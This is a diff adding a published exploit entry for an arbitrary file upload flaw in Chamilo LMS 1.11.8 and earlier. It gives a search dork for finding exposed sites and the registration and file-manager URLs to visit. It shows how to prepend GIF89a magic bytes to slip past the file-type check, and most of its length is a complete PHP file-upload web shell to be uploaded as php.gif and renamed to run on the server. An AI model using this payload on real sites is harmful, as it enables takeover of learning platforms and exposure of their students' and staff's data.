@@ -1,0 +1,55 @@
+# Exploit Title: Chamillo LMS 1.11.8 - Arbitrary File Upload 
+# Google Dork: "powered by chamilo"
+# Date: 2018-10-05
+# Exploit Author: Sohel Yousef jellyfish security team
+# Software Link: https://chamilo.org/en/download/
+# Version: Chamilo 1.11.8 or lower to 1.8 
+# Category: webapps
+
+# 1. Description
+# Any registered user can upload files and rename and change the file type to 
+# php5 or php7 by ckeditor module in my files section 
+
+# register here :
+# http://localhost/chamilo//main/auth/inscription.php
+# after registration you can view this sections 
+# http://localhost/chamilo/main/social/myfiles.php
+# http://localhost/chamilo/main/inc/lib/elfinder/filemanager.php?&CKEditor=content&CKEditorFuncNum=0
+# upload your shell in gif format and then rename the format 
+# if the rename function was desabled and add this  GIF89;aGIF89;aGIF89;a   before <?PHP
+# to be like this for examlple
+
+GIF89;aGIF89;aGIF89;a<html>
+ <head>
+  <title>PHP Test</title>
+  <form action="" method="post" enctype="multipart/form-data">
+  <input type="file" name="fileToUpload" id="fileToUpload">
+  <input type="submit" value="upload file" name="submit">
+  </form>
+ </head>
+ <body>
+ <?php echo '<p>FILE UPLOAD</p><br>';
+ $tgt_dir = "uploads/";
+ $tgt_file = $tgt_dir.basename($_FILES['fileToUpload']['name']);
+ echo "<br>TARGET FILE= ".$tgt_file;
+ //$filename = $_FILES['fileToUpload']['name'];
+ echo "<br>FILE NAME FROM VARIABLE:- ".$_FILES["fileToUpload"]["name"];
+ if(isset($_POST['submit']))
+ {
+ if(file_exists("uploads/".$_FILES["fileToUpload"]["name"]))
+    { echo "<br>file exists, try with another name"; }
+ else   {
+         echo "<br>STARTING UPLOAD PROCESS<br>";
+        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"],
+$tgt_file))
+        { echo "<br>File UPLOADED:- ".$tgt_file; }
+
+          else  { echo "<br>ERROR WHILE UPLOADING FILE<br>"; }
+    }
+ }
+?>
+ </body>
+</html>
+
+# and uplaod it as php.gif
+# you can browse the files form right click and click on browse option
